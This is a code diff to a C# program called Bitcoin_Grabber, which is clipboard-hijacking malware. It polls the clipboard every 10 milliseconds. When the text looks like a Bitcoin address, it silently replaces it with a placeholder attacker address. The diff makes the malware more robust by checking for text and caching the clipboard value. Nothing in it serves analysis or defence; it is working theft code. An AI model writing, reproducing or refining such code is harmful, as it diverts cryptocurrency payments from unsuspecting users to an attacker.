@@ -20,23 +20,27 @@ namespace Bitcoin_Grabber
             // the length is between 26-35 characters
             // more info https://en.bitcoin.it/wiki/Address
             string bitcoinAddress = "1This is your bitcoin address";
-
+            string clipboard = string.Empty;
 
             for (; ; )
             {
                 Thread.Sleep(10);
-                if (Clipboard.GetText() != bitcoinAddress)
-                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
-                        if (Clipboard.GetText().StartsWith("1") ||
-                            Clipboard.GetText().StartsWith("3") ||
-                            Clipboard.GetText().StartsWith("bc1"))
-                        {
-                            new Thread(() =>
+                if (Clipboard.ContainsText())
+                {
+                    clipboard = Clipboard.GetText();
+                    if (clipboard != bitcoinAddress)
+                        if (clipboard.Length >= 26 && clipboard.Length <= 35)
+                            if (clipboard.StartsWith("1") ||
+                                clipboard.StartsWith("3") ||
+                                clipboard.StartsWith("bc1"))
                             {
-                                Clipboard.SetText(bitcoinAddress);
-                            })
-                            { ApartmentState = ApartmentState.STA }.Start();
-                        }
+                                new Thread(() =>
+                                {
+                                    Clipboard.SetText(bitcoinAddress);
+                                })
+                                { ApartmentState = ApartmentState.STA }.Start();
+                            }
+                }
             }
 
 
